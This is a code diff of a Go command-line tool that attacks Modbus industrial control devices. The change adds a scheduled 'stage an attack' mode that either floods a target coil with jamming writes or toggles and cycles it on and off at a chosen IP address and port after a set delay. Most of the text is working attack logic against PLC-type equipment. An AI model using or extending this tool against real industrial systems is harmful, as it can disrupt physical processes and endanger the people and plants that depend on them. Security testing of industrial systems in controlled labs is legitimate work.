@@ -21,19 +21,27 @@ func modbusConnection(ip_address string, port string) modbus.Client {
 	}
 
 	defer handler.Close()
-
 	client := modbus.NewClient(handler)
-
 	return client
 }
 
-func timeDelay(timeMin int, ip_address string, port string, jamming int, runtime int, coil uint16, coil_val int) {
+// func toggle(ip_address string, port string, coil uint16, coil_value int, cycle bool, timeCycle int, cycleDelay int)
+func timeDelay(timeMin int, ip_address string, port string, jamming int, runtime int, coil uint16, coil_val int, selector bool, cycle bool, timeCycle int, cycleDelay int) {
 	timer2 := time.NewTimer(time.Duration(timeMin) * time.Minute)
-	go func() {
-		<-timer2.C
-		fmt.Println("Begining delayed attack")
-		go denial(ip_address, port, jamming, runtime, coil, coil_val)
-	}()
+	if selector {
+		go func() {
+			<-timer2.C
+			fmt.Println("Begining toggle")
+			go toggle(ip_address, port, coil, coil_val, cycle, timeCycle, cycleDelay) //cycle bool, timeCycle int, cycleDelay int)
+		}()
+	} else {
+		go func() {
+			<-timer2.C
+			fmt.Println("Begining delayed attack")
+			go denial(ip_address, port, jamming, runtime, coil, coil_val)
+		}()
+	}
+
 }
 
 func jammer(target modbus.Client, coil uint16, coil_value int, stopChannel chan bool) {
@@ -122,7 +130,6 @@ func toggle(ip_address string, port string, coil uint16, coil_value int, cycle b
 }
 
 func main() {
-
 	for {
 		var userSelection int
 		fmt.Println("Enter: \n 1) For denial attack \n 2) Toggle \n 3) Stage an attack")
@@ -191,21 +198,23 @@ func main() {
 			go toggle(ip_address, port, coil, coil_value, cycle, timeCycle, cycleDelay)
 
 		} else if userSelection == 3 {
+			var runtime int
 			var ip_address string
+			var timeCycle int
+			var cycleDelay int
+			var cycle bool
+			var jamming int
+
+			var selector bool
+			fmt.Println("Enter 1 for toggle/cycle or 0 for denial")
+			fmt.Scanln(&selector)
+
 			fmt.Println("Enter an ip address")
 			fmt.Scanln(&ip_address)
 
 			var port string
 			fmt.Println("Enter a port (default Modbus port is 502)")
 			fmt.Scanln(&port)
-
-			var jamming int
-			fmt.Println("Enter a number of jammers")
-			fmt.Scanln(&jamming)
-
-			var runtime int
-			fmt.Println("Enter a runtime:")
-			fmt.Scanln(&runtime)
 
 			var coil uint16
 			fmt.Println("Enter a coil:")
@@ -215,11 +224,35 @@ func main() {
 			fmt.Println("Enter a coil value:")
 			fmt.Scanln(&coil_value)
 
+			if selector {
+				fmt.Println("Enter 1 to cycle, enter 0 for on/off")
+				fmt.Scanln(&cycle)
+
+				if cycle {
+					fmt.Println("Enter cylce time")
+					fmt.Scanln(&timeCycle)
+
+					fmt.Println("Enter delay between cycle in seconds")
+					fmt.Scanln(&cycleDelay)
+				} else {
+					timeCycle = 0
+					cycleDelay = 0
+					jamming = 0
+				}
+			} else {
+
+				fmt.Println("Enter a number of jammers")
+				fmt.Scanln(&jamming)
+
+				fmt.Println("Enter a runtime:")
+				fmt.Scanln(&runtime)
+			}
+
 			var timeMin int
 			fmt.Println("Enter how many minutes wait before starting attack:")
 			fmt.Scanln(&timeMin)
 
-			go timeDelay(timeMin, ip_address, port, jamming, runtime, coil, coil_value)
+			go timeDelay(timeMin, ip_address, port, jamming, runtime, coil, coil_value, selector, cycle, timeCycle, cycleDelay)
 		}
 	}
 }
